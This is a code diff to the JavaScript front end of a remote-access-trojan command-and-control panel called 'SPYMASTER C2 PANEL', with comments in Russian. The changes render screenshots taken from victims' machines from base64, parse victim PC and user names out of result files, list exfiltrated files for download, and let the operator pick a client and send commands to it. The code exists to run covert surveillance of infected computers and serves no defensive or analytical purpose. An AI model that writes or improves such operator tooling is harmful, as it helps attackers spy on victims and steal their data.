@@ -1,4 +1,4 @@
-// ============= SPYMASTER C2 PANEL - ИСПРАВЛЕННАЯ ВЕРСИЯ =============
+// ============= SPYMASTER C2 PANEL - СКРИНШОТЫ КАК КАРТИНКИ =============
 // АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ
 
 // ============= КОНФИГУРАЦИЯ =============
@@ -80,6 +80,17 @@ function showNotification(message, type = "info") {
     setTimeout(() => notification.remove(), 3000);
 }
 
+// ============= ПРОВЕРКА ЯВЛЯЕТСЯ ЛИ СТРОКА BASE64 ИЗОБРАЖЕНИЕМ =============
+function isBase64Image(str) {
+    if (!str || typeof str !== 'string') return false;
+    // Проверяем сигнатуру PNG (iVBORw0KGgo) или JPG (/9j/4AAQ)
+    return str.startsWith('iVBORw0KGgo') || str.startsWith('/9j/4AAQ');
+}
+
+function isImageFile(filename) {
+    return filename.endsWith('.png') || filename.endsWith('.jpg') || filename.endsWith('.jpeg');
+}
+
 // ============= ОТПРАВКА КОМАНД =============
 async function sendCommand(command, clientId = null) {
     if (!command) return;
@@ -132,13 +143,52 @@ async function sendCommand(command, clientId = null) {
     }
 }
 
-// ============= ОПРЕДЕЛЕНИЕ ТИПА ФАЙЛА =============
-function isImageFile(filename) {
-    return filename.endsWith('.png') || filename.endsWith('.jpg') || filename.endsWith('.jpeg') || filename.endsWith('.gif');
-}
-
-function isTextFile(filename) {
-    return filename.endsWith('.txt');
+// ============= ОБРАБОТКА СКРИНШОТА (base64 -> картинка) =============
+function displayScreenshot(base64Data, filename) {
+    const grid = document.getElementById("screensGrid");
+    if (!grid) return;
+    
+    // Создаём карточку
+    const card = document.createElement("div");
+    card.className = "screenshot-card";
+    card.style.cssText = "cursor:pointer;border:1px solid #00ff41;border-radius:8px;overflow:hidden;background:#0a0e27;transition:transform 0.2s";
+    card.onmouseover = () => card.style.transform = "scale(1.02)";
+    card.onmouseout = () => card.style.transform = "scale(1)";
+    
+    // Создаём изображение из base64
+    const img = document.createElement("img");
+    img.src = `data:image/png;base64,${base64Data}`;
+    img.style.cssText = "width:100%;height:150px;object-fit:cover;background:#0a0e27";
+    
+    // Обработчик клика для увеличения
+    card.onclick = () => {
+        const modal = document.createElement("div");
+        modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000;display:flex;justify-content:center;align-items:center;cursor:pointer";
+        const modalImg = document.createElement("img");
+        modalImg.src = `data:image/png;base64,${base64Data}`;
+        modalImg.style.cssText = "max-width:90%;max-height:90%;border:2px solid #00ff41";
+        modal.appendChild(modalImg);
+        modal.onclick = () => modal.remove();
+        document.body.appendChild(modal);
+    };
+    
+    const info = document.createElement("div");
+    info.style.cssText = "padding:8px;font-size:10px;text-align:center";
+    info.innerText = filename;
+    
+    card.appendChild(img);
+    card.appendChild(info);
+    
+    // Добавляем в начало сетки
+    if (grid.children.length === 0 || (grid.children[0] && grid.children[0].classList && grid.children[0].classList.contains("empty-message"))) {
+        grid.innerHTML = "";
+    }
+    grid.insertBefore(card, grid.firstChild);
+    
+    // Ограничиваем количество (оставляем последние 20)
+    while (grid.children.length > 20) {
+        grid.removeChild(grid.lastChild);
+    }
 }
 
 // ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
@@ -151,9 +201,8 @@ async function loadResults() {
         if (!Array.isArray(files)) return;
         
         // Разделяем файлы по типам
-        const results = files.filter(f => f.name.startsWith("result_"));
-        const screenshots = files.filter(f => f.name.startsWith("screenshot_") && isImageFile(f.name));
-        const textScreenshots = files.filter(f => f.name.startsWith("screenshot_") && !isImageFile(f.name));
+        const results = files.filter(f => f.name.startsWith("result_") && f.name.endsWith(".txt"));
+        const screenshotFiles = files.filter(f => f.name.startsWith("screenshot_") && (f.name.endsWith(".png") || f.name.endsWith(".txt")));
         const fileDownloads = files.filter(f => f.name.startsWith("file_"));
         
         // Обновляем статистику
@@ -161,7 +210,7 @@ async function loadResults() {
         const screensCount = document.getElementById("screensCount");
         const clientsCount = document.getElementById("clientsCount");
         if (resultsCount) resultsCount.innerText = results.length;
-        if (screensCount) screensCount.innerText = screenshots.length + textScreenshots.length;
+        if (screensCount) screensCount.innerText = screenshotFiles.length;
         if (clientsCount) clientsCount.innerText = clients.length;
         
         // ============= ОБРАБОТКА РЕЗУЛЬТАТОВ (result_xxx.txt) =============
@@ -178,20 +227,13 @@ async function loadResults() {
                 }
                 
                 // ПАРСИНГ КЛИЕНТА из результата
-                // Ищем "[Connected] PC: DESKTOP-ABC123"
                 let pcMatch = content.match(/PC:\s*([^\n]+)/);
-                let userMatch = content.match(/User:\s*([^\n]+)/);
-                
-                // Альтернативный паттерн для [Connected]
-                if (!pcMatch) {
-                    pcMatch = content.match(/\[Connected\]\s*PC:\s*([^\n]+)/i);
-                }
-                if (!pcMatch) {
-                    pcMatch = content.match(/COMPUTERNAME[=:]\s*([^\n]+)/i);
-                }
+                if (!pcMatch) pcMatch = content.match(/\[Connected\]\s*PC:\s*([^\n]+)/i);
+                if (!pcMatch) pcMatch = content.match(/COMPUTERNAME[=:]\s*([^\n]+)/i);
                 
                 if (pcMatch) {
                     const clientId = pcMatch[1].trim();
+                    const userMatch = content.match(/User:\s*([^\n]+)/);
                     const userName = userMatch ? userMatch[1].trim() : "Unknown";
                     
                     if (!clients.find(c => c.id === clientId)) {
@@ -209,44 +251,47 @@ async function loadResults() {
         }
         
         // ============= ОБРАБОТКА СКРИНШОТОВ =============
-        // Для PNG изображений
-        for (const shot of screenshots) {
-            if (!seenFiles.includes(shot.name)) {
-                seenFiles.push(shot.name);
-                addLog(`📸 СКРИНШОТ: ${shot.name}`, "success");
-                showNotification(`Скриншот получен!`, "success");
-            }
-        }
-        
-        // Для текстовых скриншотов (костыль, если RAT отправил как текст)
-        for (const shot of textScreenshots) {
-            if (!seenFiles.includes(shot.name)) {
-                seenFiles.push(shot.name);
-                const content = await fetch(shot.download_url).then(r => r.text());
-                addLog(`📸 СКРИНШОТ (текст): ${shot.name}`, "result");
-                addLog(`   ${content.substring(0, 200)}`, "result");
-            }
-        }
-        
-        // ============= ОБНОВЛЕНИЕ СЕТКИ СКРИНШОТОВ (только PNG) =============
-        const grid = document.getElementById("screensGrid");
-        if (grid) {
-            if (screenshots.length > 0) {
-                grid.innerHTML = "";
-                for (const shot of screenshots.slice(-12).reverse()) {
-                    const card = document.createElement("div");
-                    card.className = "screenshot-card";
-                    card.onclick = () => window.open(shot.download_url, '_blank');
-                    card.innerHTML = `
-                        <img src="${shot.download_url}?t=${Date.now()}" 
-                             style="width:100%;height:120px;object-fit:cover;background:#0a0e27" 
-                             onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'200\' height=\'120\'%3E%3Crect width=\'200\' height=\'120\' fill=\'%230a0e27\'/%3E%3Ctext x=\'100\' y=\'60\' fill=\'%2300ff41\' text-anchor=\'middle\'%3E📸%3C/text%3E%3C/svg%3E'">
-                        <div style="padding:5px;font-size:10px;text-align:center">${shot.name}</div>
-                    `;
-                    grid.appendChild(card);
+        for (const file of screenshotFiles) {
+            if (!seenFiles.includes(file.name)) {
+                seenFiles.push(file.name);
+                
+                const content = await fetch(file.download_url).then(r => r.text());
+                
+                // Проверяем, является ли содержимое base64 изображением
+                if (isBase64Image(content)) {
+                    addLog(`📸 СКРИНШОТ: ${file.name} (base64 -> картинка)`, "success");
+                    displayScreenshot(content, file.name);
+                    showNotification(`Скриншот получен!`, "success");
+                } 
+                // Если это PNG файл
+                else if (file.name.endsWith('.png')) {
+                    addLog(`📸 СКРИНШОТ: ${file.name} (PNG файл)`, "success");
+                    // Отображаем как обычную картинку
+                    const grid = document.getElementById("screensGrid");
+                    if (grid) {
+                        const card = document.createElement("div");
+                        card.className = "screenshot-card";
+                        card.style.cssText = "cursor:pointer;border:1px solid #00ff41;border-radius:8px;overflow:hidden;background:#0a0e27";
+                        const img = document.createElement("img");
+                        img.src = file.download_url + "?t=" + Date.now();
+                        img.style.cssText = "width:100%;height:150px;object-fit:cover";
+                        card.onclick = () => window.open(file.download_url, '_blank');
+                        const info = document.createElement("div");
+                        info.style.cssText = "padding:8px;font-size:10px;text-align:center";
+                        info.innerText = file.name;
+                        card.appendChild(img);
+                        card.appendChild(info);
+                        if (grid.children.length === 0 || (grid.children[0] && grid.children[0].classList && grid.children[0].classList.contains("empty-message"))) {
+                            grid.innerHTML = "";
+                        }
+                        grid.insertBefore(card, grid.firstChild);
+                    }
                 }
-            } else {
-                grid.innerHTML = '<div class="empty-message">📭 Нет скриншотов</div>';
+                // Текстовый скриншот (костыль)
+                else {
+                    addLog(`📸 СКРИНШОТ (текст): ${file.name}`, "result");
+                    addLog(`   ${content.substring(0, 200)}`, "result");
+                }
             }
         }
         
@@ -258,14 +303,15 @@ async function loadResults() {
                 for (const file of fileDownloads.slice(-20).reverse()) {
                     const item = document.createElement("div");
                     item.className = "file-item";
+                    item.style.cssText = "background:#0a0e27;border:1px solid #00ff41;border-radius:5px;padding:10px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center";
                     item.innerHTML = `
-                        <span class="file-name">📄 ${file.name}</span>
-                        <button class="file-download" onclick="window.open('${file.download_url}', '_blank')">⬇️ СКАЧАТЬ</button>
+                        <span style="font-size:12px">📄 ${file.name}</span>
+                        <button class="file-download" onclick="window.open('${file.download_url}', '_blank')" style="background:#1a1f4e;border:none;color:#00ff41;padding:5px10px;cursor:pointer;border-radius:4px">⬇️ СКАЧАТЬ</button>
                     `;
                     filesList.appendChild(item);
                 }
             } else {
-                filesList.innerHTML = '<div class="empty-message">📭 Нет загруженных файлов</div>';
+                filesList.innerHTML = '<div class="empty-message" style="text-align:center;padding:40px;color:#444">📭 Нет загруженных файлов</div>';
             }
         }
         
@@ -293,23 +339,31 @@ function updateClientsList() {
             for (const client of clients) {
                 const card = document.createElement("div");
                 card.className = "client-card";
-                card.style.cssText = "background:#0a0e27;border:1px solid #00ff41;border-radius:8px;padding:12px;margin-bottom:10px;cursor:pointer";
+                card.style.cssText = "background:#0a0e27;border:1px solid #00ff41;border-radius:8px;padding:12px;margin-bottom:10px;cursor:pointer;transition:all 0.2s";
+                card.onmouseover = () => card.style.background = "#1a1f4e";
+                card.onmouseout = () => card.style.background = "#0a0e27";
                 card.onclick = () => {
                     document.getElementById("clientSelect").value = client.id;
                     currentClient = client.id;
                     addLog(`🎯 ВЫБРАН КЛИЕНТ: ${client.id}`, "success");
                 };
                 card.innerHTML = `
-                    <div style="font-weight:bold;font-size:14px">🖥️ ${client.id}</div>
-                    <div style="font-size:11px;color:#888">👤 ${client.user}</div>
-                    <div style="font-size:10px;color:#00ff41">🕐 Подключен: ${client.firstSeen}</div>
+                    <div style="font-weight:bold;font-size:14px">🖥️ ${escapeHtml(client.id)}</div>
+                    <div style="font-size:11px;color:#888">👤 ${escapeHtml(client.user)}</div>
+                    <div style="font-size:10px;color:#00ff41">🕐 Подключен: ${escapeHtml(client.firstSeen)}</div>
                 `;
                 clientsDiv.appendChild(card);
             }
         } else {
-            clientsDiv.innerHTML = '<div class="empty-message">💤 Нет подключенных клиентов</div>';
+            clientsDiv.innerHTML = '<div class="empty-message" style="text-align:center;padding:40px;color:#444">💤 Нет подключенных клиентов</div>';
         }
     }
+}
+
+function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
 }
 
 // ============= ОСТАЛЬНЫЕ ФУНКЦИИ =============
@@ -365,7 +419,7 @@ function startAutoRefresh() {
 
 // ============= ИНИЦИАЛИЗАЦИЯ =============
 function init() {
-    addLog("🐀 SPYMASTER C2 PANEL v2.0", "system");
+    addLog("🐀 SPYMASTER C2 PANEL v3.0", "system");
     addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system");
     
     // Стили
